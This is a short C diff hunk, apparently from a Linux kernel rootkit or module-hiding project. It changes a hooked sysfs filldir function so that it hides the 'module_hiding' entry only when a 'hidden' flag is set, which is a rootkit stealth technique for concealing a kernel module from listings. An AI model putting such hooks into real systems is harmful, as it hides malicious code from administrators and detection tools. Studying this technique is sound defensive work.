@@ -35,7 +35,7 @@ static void dummy_callback(char* buf, int size){
 }
 
 int hooked_sysfs_filldir(void* __buf, const char* name, int namelen, loff_t offset, u64 ino, unsigned d_type){
-    if (strcmp(name, "module_hiding") == 0){
+    if (hidden && strcmp(name, "module_hiding") == 0){
         OUR_DEBUG("hooked_sysfs_filldir: %s\n", (char*)name);
         return 0;
     }
